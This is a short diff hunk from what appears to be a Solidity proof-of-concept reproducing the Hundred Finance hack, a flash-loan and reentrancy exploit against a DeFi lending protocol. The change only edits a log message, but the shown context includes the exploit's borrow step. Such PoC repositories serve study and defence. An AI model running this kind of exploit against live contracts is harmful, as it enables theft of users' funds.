@@ -79,7 +79,7 @@ contract HundredFinanceHack is FlashLoan, Reentrancy, PoC {
             ICompoundToken(address(husd)).borrow(amount);
 
             // Attacker USDC and xdai balances after borrow
-            console.log("Attacker USDC and xdai balances after borrow");
+            console.log("Attacker USDC and xdai balances after borrow attack");
             snapshotAndPrint(address(this), tokens);
         }
     }
